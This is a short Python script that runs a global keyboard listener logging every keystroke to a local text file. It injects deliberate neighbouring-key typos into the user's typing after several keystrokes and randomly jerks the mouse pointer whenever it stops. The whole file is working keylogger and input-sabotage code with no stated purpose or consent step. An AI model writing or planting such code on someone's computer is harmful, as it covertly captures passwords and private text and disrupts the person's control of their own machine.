import pyautogui
import pynput
import time
import random
import threading

# Global variables to store the current mouse position and the state of the mouse movement
current_mouse_pos = pyautogui.position()
mouse_stopped_time = time.time()
alteration_sleeping = False

# Log file for keystrokes
log_file = "keystrokes_log.txt"

# QWERTY layout dictionary
qwerty_layout = {
    'q': ['w'], 'w': ['q', 'e'], 'e': ['w', 'r'], 'r': ['e', 't'], 't': ['r', 'y'], 'y': ['t', 'u'],
    'u': ['y', 'i'], 'i': ['u', 'o'], 'o': ['i', 'p'], 'p': ['o'],
    'a': ['s'], 's': ['a', 'd'], 'd': ['s', 'f'], 'f': ['d', 'g'], 'g': ['f', 'h'], 'h': ['g', 'j'],
    'j': ['h', 'k'], 'k': ['j', 'l'], 'l': ['k'],
    'z': ['x'], 'x': ['z', 'c'], 'c': ['x', 'v'], 'v': ['c', 'b'], 'b': ['v', 'n'], 'n': ['b', 'm'],
    'm': ['n']
}

# Typo control variables
keystroke_count = 0
pause_typo = False

# Function to log keystrokes
def on_press(key):
    global keystroke_count, pause_typo
    
    if not pause_typo:
        try:
            if hasattr(key, 'char') and key.char in qwerty_layout:
                keystroke_count += 1
                with open(log_file, "a") as f:
                    f.write(f'{key.char} ')
                if 7 <= keystroke_count <= 12:
                    make_typo(key.char)
                    keystroke_count = 0
                    pause_typo = True
                    threading.Timer(6, reset_typo_pause).start()
            else:
                with open(log_file, "a") as f:
                    f.write(f'{key} ')
        except AttributeError:
            with open(log_file, "a") as f:
                f.write(f'{key} ')

def make_typo(char):
    typo_char = random.choice(qwerty_layout[char])
    pyautogui.typewrite(typo_char, interval=0.1)

def reset_typo_pause():
    global pause_typo
    pause_typo = False

# Function to alter mouse movements
def alter_mouse_movement():
    global current_mouse_pos, mouse_stopped_time, alteration_sleeping

    while True:
        new_mouse_pos = pyautogui.position()
        if new_mouse_pos == current_mouse_pos:
            if time.time() - mouse_stopped_time > 0.05:
                if random.random() < 1/6:
                    new_x = new_mouse_pos.x + random.uniform(-20, 20)
                    new_y = new_mouse_pos.y + random.uniform(-20, 20)
                    pyautogui.moveTo(new_x, new_y)
            if time.time() - mouse_stopped_time > 0.1:
                alteration_sleeping = True
                while alteration_sleeping and new_mouse_pos == current_mouse_pos:
                    time.sleep(0.1)
                alteration_sleeping = False
            time.sleep(0.01)
        else:
            current_mouse_pos = new_mouse_pos
            mouse_stopped_time = time.time()
        time.sleep(0.01)

# Function to detect mouse movement and wake up the alteration thread
def detect_mouse_movement():
    global current_mouse_pos, alteration_sleeping

    while True:
        new_mouse_pos = pyautogui.position()
        if new_mouse_pos != current_mouse_pos:
            current_mouse_pos = new_mouse_pos
            if alteration_sleeping:
                alteration_sleeping = False
        time.sleep(0.1)

# Setting up the keyboard listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

# Starting the keyboard listener
keyboard_listener.start()

# Starting the mouse alteration in a separate thread
mouse_thread = threading.Thread(target=alter_mouse_movement)
mouse_thread.start()

# Starting the mouse movement detector in a separate thread
mouse_movement_thread = threading.Thread(target=detect_mouse_movement)
mouse_movement_thread.start()

# Keeping the main thread alive
keyboard_listener.join()
mouse_thread.join()
mouse_movement_thread.join()